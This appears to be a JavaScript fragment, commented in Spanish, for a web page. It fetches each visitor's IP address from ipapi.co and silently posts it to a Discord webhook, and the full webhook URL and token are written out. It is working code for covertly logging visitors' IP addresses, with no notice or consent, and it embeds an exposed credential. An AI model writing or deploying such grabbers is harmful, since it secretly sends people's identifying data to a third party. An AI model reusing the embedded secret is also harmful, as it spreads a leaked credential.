        // Obtener la dirección IP del visitante
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;

                // Crear un objeto con los datos que deseas enviar a Discord
                const message = {
                    content: `La IP del visitante es: ${ipAddress}`,
                };

                // Enviar la información a la webhook de Discord
                fetch('https://discord.com/api/webhooks/1165176949388365836/4SrFU4Dteo8tKuE-H4JOqpmx_6_cpDkrJ_xTu8Q00oZIdZB1m4AdJvpo-Q2pVdLPtLi9', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message),
                });
            })
            .catch(error => console.error(error));